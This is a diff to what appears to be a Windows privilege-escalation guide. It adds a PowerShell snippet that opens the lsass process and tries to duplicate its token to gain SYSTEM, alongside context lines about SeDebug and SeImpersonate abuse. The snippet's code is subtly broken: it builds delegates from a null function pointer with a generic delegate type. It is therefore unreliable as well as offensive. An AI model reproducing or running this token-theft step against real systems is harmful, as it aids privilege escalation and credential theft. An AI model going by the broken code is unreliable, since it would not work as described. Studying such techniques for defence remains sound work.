@@ -156,6 +156,20 @@ Run the script to get system
 
 #### 5) VOILA!
 
+### Alternate method: Powershell
+
+Use powershell to duplicate the lsass.exe token (example)
+
+    $ProcessId = (Get-Process lsass).Id
+    $ProcessHandle = [System.Diagnostics.Process]::GetProcessById($ProcessId).Handle
+    $TokenHandle = New-Object System.IntPtr
+    
+    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.IntPtr]::Zero,[System.Type]::GetType('System.Delegate'))
+    $DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.IntPtr]::Zero,[System.Type]::GetType('System.Delegate'))
+    
+    $OpenProcessToken.Invoke($ProcessHandle, 2, [ref]$TokenHandle)
+    $DuplicateTokenEx.Invoke($TokenHandle, 2, $Null, 2, 1, [ref]$TokenHandle)
+
 ## TIP: If the SeDebug Privilege is disabled, we can enable it with psgetsystem powershell script (Link attached at the top of this attack's explanation)
 
 ### Alternate Method for SeImpersonate and SeDebug: 
